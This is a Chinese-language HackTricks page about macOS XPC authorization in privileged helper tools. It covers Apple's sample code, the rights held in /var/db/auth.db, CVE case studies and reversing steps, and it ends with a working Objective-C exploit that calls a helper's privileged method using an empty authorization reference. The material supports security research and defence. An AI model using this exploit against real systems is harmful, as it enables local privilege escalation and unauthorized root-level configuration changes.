# macOS XPC 授权

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC 授权

Apple 还提出了另一种认证方式，如果连接进程具有 **调用已公开的 XPC 方法的权限**。

当应用需要 **以特权用户身份执行操作** 时，通常不会以特权用户运行整个应用，而是以 root 身份安装一个 HelperTool 作为 XPC 服务，应用可以调用该服务来执行这些操作。但调用该服务的应用应该具有足够的授权。

### ShouldAcceptNewConnection 总是返回 YES

示例可见于 [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)。在 `App/AppDelegate.m` 中，它尝试 **连接** 到 **HelperTool**。而在 `HelperTool/HelperTool.m` 中，函数 **`shouldAcceptNewConnection`** **不会检查** 之前提到的任何要求。它总是返回 YES：
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
有关如何正确配置此检查的更多信息：

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### 应用权限

不过，**当从 HelperTool 调用某个方法时，会发生一些授权操作**。

函数 **`applicationDidFinishLaunching`**（位于 `App/AppDelegate.m`）会在应用启动后创建一个空的授权引用。这应该始终有效。\
然后，它会尝试通过调用 `setupAuthorizationRights` 向该授权引用**添加一些权限**：
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
函数 `setupAuthorizationRights`（位于 `Common/Common.m`）会将应用程序的权限存储到 auth 数据库 `/var/db/auth.db` 中。注意它只会添加尚未存在于数据库中的权限：
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
函数 `enumerateRightsUsingBlock` 用于获取应用程序权限，这些权限定义在 `commandInfo` 中：
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
这意味着在该过程结束时，声明在 `commandInfo` 中的权限将被存储在 `/var/db/auth.db`。请注意，在那里你可以为 **每个方法**（将**需要身份验证**）找到 **权限名称** 和 **`kCommandKeyAuthRightDefault`**。后者 **指示谁可以获得此权限**。

有不同的作用域用于表示谁可以访问某个权限。其中一些在 [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)（you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)）中定义，但总结如下：

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>任何人</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>无人</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>当前用户需要是管理员（在管理员组内）</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>要求用户进行身份验证。</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>要求用户进行身份验证。用户需要是管理员（在管理员组内）</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>指定规则</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>为该权限指定一些额外注释</td></tr></tbody></table>

### 权限验证

在 `HelperTool/HelperTool.m` 中，函数 **`readLicenseKeyAuthorization`** 通过调用函数 **`checkAuthorization`** 来检查调用者是否被授权 **执行该方法**。该函数将检查调用进程发送的 **authData** 是否具有 **正确的格式**，然后检查调用特定方法所需的 **获得该权限的条件**。如果一切正常，**返回的 `error` 将为 `nil`**：
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
注意，为了**检查获得调用该方法的权限要求**，函数 `authorizationRightForCommand` 将只检查之前提到的对象 **`commandInfo`**。然后，它会调用 **`AuthorizationCopyRights`** 来检查**是否有权**调用该函数（注意 flags 允许与用户交互）。

在这种情况下，要调用函数 `readLicenseKeyAuthorization`，`kCommandKeyAuthRightDefault` 被定义为 `@kAuthorizationRuleClassAllow`。所以**任何人都可以调用它**。

### DB 信息

已提到这些信息存储在 `/var/db/auth.db`。你可以列出所有存储的规则：
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
然后，你可以读取谁可以访问该权限：
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 宽松权限

你可以在 **所有权限配置** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/)，但不会要求用户交互的组合如下：

1. **'authenticate-user': 'false'**
- 这是最直接的键。如果设置为 `false`，表示用户不需要进行身份验证即可获得此权限。
- 这用于 **与下面两项之一组合或指示用户必须属于的组**。
2. **'allow-root': 'true'**
- 如果用户以 root 用户身份操作（具有提升的权限），并且此键设置为 `true`，root 用户可能在无需进一步验证的情况下获得此权限。然而，通常获取 root 权限本身就需要验证，所以对大多数用户而言，这并不是一个“无需验证”的场景。
3. **'session-owner': 'true'**
- 如果设置为 `true`，会话的所有者（当前已登录的用户）将自动获得此权限。如果用户已经登录，这可能会绕过额外的验证。
4. **'shared': 'true'**
- 此键本身不会在没有验证的情况下授予权限。相反，如果设置为 `true`，则表示一旦该权限被验证过，它可以在多个进程之间共享，而每个进程不需要重新验证。但是，权限的初次授予仍然需要验证，除非与其他键（例如 `'authenticate-user': 'false'`）结合使用。

你可以 [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) 来获取有趣的权限：
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### 授权绕过案例研究

- **CVE-2024-4395 – Jamf Compliance Editor helper**: 运行审计会在 `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` 放置文件，暴露 Mach 服务 `com.jamf.complianceeditor.helper`，并导出 `-executeScriptAt:arguments:then:`，但未验证调用方的 `AuthorizationExternalForm` 或代码签名。一个简单的利用通过 `AuthorizationCreate` 创建一个空引用，使用 `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` 连接，并调用该方法以 root 身份执行任意二进制。完整逆向笔记（含 PoC）见 [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 and 7.4.0–7.4.2 接受构造的 XPC 消息，这些消息到达了缺乏授权门控的特权 helper。由于 helper 信任其自身的特权 `AuthorizationRef`，任何能够向该服务发送消息的本地用户都可以强制其以 root 身份执行任意配置更改或命令。详情见 [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### 快速排查提示

- 当一个 app 同时包含 GUI 和 helper 时，diff 它们的 code requirements 并检查 `shouldAcceptNewConnection` 是否使用 `-setCodeSigningRequirement:` 锁定监听器（或验证 `SecCodeCopySigningInformation`）。缺少这些检查通常会导致像 Jamf 案例那样的 CWE-863 场景。快速查看示例如：
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- 比较辅助程序*认为*它在授权的内容与客户端提供的内容。当进行逆向时，在 `AuthorizationCopyRights` 上断点，并确认 `AuthorizationRef` 源自 `AuthorizationCreateFromExternalForm`（由客户端提供），而不是辅助程序自身的特权上下文；否则你很可能发现了与上面类似的 CWE-863 模式。

## Authorization 的逆向分析

### 检查是否使用了 EvenBetterAuthorization

如果你找到函数：**`[HelperTool checkAuthorization:command:]`**，则该进程很可能使用前面提到的授权方案：

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

然后，如果该函数调用了诸如 `AuthorizationCreateFromExternalForm`、`authorizationRightForCommand`、`AuthorizationCopyRights`、`AuhtorizationFree` 等函数，则它使用了 [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154)。

检查 **`/var/db/auth.db`**，查看是否可以在无需用户交互的情况下获取调用某些特权操作的权限。

### 协议通信

接下来，需要找到协议 schema，以便能够与 XPC 服务建立通信。

函数 **`shouldAcceptNewConnection`** 表明正在导出的协议：

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

在这种情况下，我们有与 EvenBetterAuthorizationSample 相同的实现，参见 [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)。

知道所用协议的名称后，可以使用以下方法**导出其头文件定义**：
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
最后，我们只需要知道 **暴露的 Mach Service 的名称**，以便与其建立通信。有几种方法可以找到它：

- 在 **`[HelperTool init]`** 中，你可以看到 Mach Service 被使用：

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- 在 launchd plist：
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit 示例

在此示例中创建了：

- 定义了包含函数的协议
- 一个用于请求访问的空 auth
- 与 XPC 服务的连接
- 如果连接成功，则调用该函数
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 其他被滥用的 XPC 提权助手

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## 参考资料

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
